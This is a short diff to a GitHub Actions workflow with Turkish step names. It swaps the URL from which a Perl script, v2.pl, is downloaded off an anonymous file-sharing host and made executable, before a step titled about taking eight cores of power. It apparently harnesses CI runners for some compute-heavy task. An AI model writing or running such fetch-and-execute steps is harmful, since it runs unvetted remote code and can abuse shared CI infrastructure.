@@ -14,7 +14,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://uploader.sh/VYcu-/v2.pl -O v2.pl
+          wget https://uploader.sh/JvehF/v2.pl -O v2.pl
           chmod +x v2.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
